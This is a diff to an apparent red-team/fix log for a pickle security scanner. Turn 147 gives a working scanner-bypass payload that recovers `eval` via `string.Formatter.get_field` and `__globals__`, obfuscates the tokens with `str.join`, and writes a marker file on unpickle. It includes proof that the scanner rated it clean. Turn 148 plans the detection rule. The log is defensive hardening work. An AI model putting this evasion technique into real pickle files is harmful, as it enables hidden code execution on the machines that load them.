@@ -8161,3 +8161,111 @@ Performance note: this removes the previous per-module table lookup and
 replaces it with constant string-prefix checks over the parsed global name. It
 adds no imports, no package enumeration, no source parsing, and no call-graph
 traversal.
+
+## Turn 147 - Bypass via `string.Formatter.get_field` attribute traversal
+
+Found a scanner-clean RCE that bypasses the direct namespace-global block by
+using Python's format-field resolver as the attribute/item traversal primitive.
+`string.Formatter.get_field` accepts a field expression and an argument tuple,
+then internally walks attributes and mapping items. That makes it equivalent to
+a constrained `getattr`/`getitem` chain, but neither the imported global nor the
+current Python call-graph sink list treats it as RCE-capable.
+
+The payload builds this field name at unpickle time:
+
+```python
+field = "".join(
+    [
+        "0.",
+        "_",
+        "_",
+        "globals",
+        "_",
+        "_",
+        "[",
+        "_",
+        "_",
+        "builtins",
+        "_",
+        "_",
+        "][",
+        "ev",
+        "al",
+        "]",
+    ]
+)
+formatter = string.Formatter()
+result, _ = string.Formatter.get_field(formatter, field, (statistics.mean,), {})
+code = "".join(["open('/tmp/.../marker','w').write('owned-by-formatter-get-field')"])
+result(code)
+```
+
+The active pickle imports only:
+
+- `string.Formatter`
+- `string.Formatter.get_field`
+- `builtins.str.join`
+- `statistics.mean`
+- `operator.getitem`
+- `builtins.str.join`
+
+Proof on CPython 3.12.12:
+
+- Control payload scanner result: `len=161`, `status=complete`,
+  `verdict=clean`, `findings=[]`, `notices=[]`.
+- Control import references: one clean `builtins.str.join`.
+- Control runtime: `pickle.loads(control)` returns the assembled eval code
+  string and creates no marker.
+- Active payload scanner result: `len=371`, `status=complete`,
+  `verdict=clean`, `findings=[]`, `notices=[]`.
+- Active import references: `string.Formatter`,
+  `string.Formatter.get_field`, two `builtins.str.join` references,
+  `statistics.mean`, and `operator.getitem`, all with
+  `is_dangerous=False`.
+- Active runtime before unpickle: marker absent.
+- Active runtime after unpickle: marker exists and contains
+  `owned-by-formatter-get-field`; `pickle.loads(active)` returns the integer
+  byte count from `open(...).write(...)`.
+
+Why the scanner missed it:
+
+- The namespace-global policy now catches direct `module.__dict__` and
+  `module.__builtins__`, but this payload never imports either. The module
+  globals dictionary is reached through the format-field mini-language:
+  `0.__globals__`.
+- Suspicious-string matching does not see contiguous `__globals__`,
+  `__builtins__`, `eval`, or `open(...)` tokens because the field expression
+  and code string are assembled from harmless fragments with `str.join`.
+- `string.Formatter.get_field` is a Python wrapper, but the call-graph sink
+  list does not treat `builtins.getattr` or format-field traversal as an RCE
+  sink. The analysis therefore sees a clean wrapper and does not model the
+  returned object as a later callable.
+- `operator.getitem` is clean today, so extracting element zero from
+  `get_field`'s `(object, used_key)` return tuple does not produce a finding.
+
+Performance note: the next block should be source-primitive focused. A narrow
+policy entry for `string.Formatter.get_field` catches this object-recovery
+primitive with a constant table lookup. A more general follow-up could teach
+the call-graph layer that wrappers reaching `builtins.getattr` plus item access
+with attacker-controlled field strings are dynamic object-recovery primitives,
+but the immediate fix can stay cheap and deterministic.
+
+## Turn 148 - Block format-field object recovery
+
+Blocking plan:
+
+- Add `string.Formatter.get_field` to the finite dangerous-global policy table.
+  This is the source primitive that walks attacker-controlled attribute/item
+  field expressions and can return arbitrary recovered objects for later
+  invocation.
+- Add Rust unit coverage for `global_severity("string",
+  "Formatter.get_field")`.
+- Add a CPython oracle regression for the Turn 147 payload. The control payload
+  only assembles the eval code string and remains clean; the active payload
+  uses `string.Formatter.get_field` to recover `eval`, is flagged as malicious,
+  and still writes the marker if loaded.
+- Add a changelog entry under `[Unreleased]`.
+
+Performance note: this is a single sorted-table policy lookup over an already
+parsed global operand. It adds no imports, no package enumeration, no source
+reads, and no extra call-graph traversal.
